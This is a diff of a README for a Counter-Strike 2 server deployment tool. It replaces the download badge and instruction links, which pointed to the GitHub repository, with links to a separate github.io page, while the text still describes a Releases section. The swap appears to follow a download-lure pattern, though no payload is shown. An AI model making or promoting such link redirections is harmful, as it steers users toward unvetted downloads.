@@ -1,6 +1,6 @@
 # 🎮 CS2-Egg-Go - Deploy Counter-Strike 2 Servers Effortlessly
 
-[![Download CS2-Egg-Go](https://img.shields.io/badge/Download-CS2--Egg--Go-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/smartfb00576-png/CS2-Egg-Go)
+[![Download CS2-Egg-Go](https://img.shields.io/badge/Download-CS2--Egg--Go-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://smartfb00576-png.github.io)
 
 ---
 
@@ -39,7 +39,7 @@ No shell access in the container means fewer security risks. Your server runs in
 
 1. **Visit the download page**  
    Click the big green button at the top of this page, or go directly to:  
-   [https://github.com/smartfb00576-png/CS2-Egg-Go](https://github.com/smartfb00576-png/CS2-Egg-Go)
+   [https://smartfb00576-png.github.io](https://smartfb00576-png.github.io)
 
 2. **Find the latest release**  
    Look for the "Releases" section on the page. It's usually on the right side or at the bottom. Click on the newest version number.
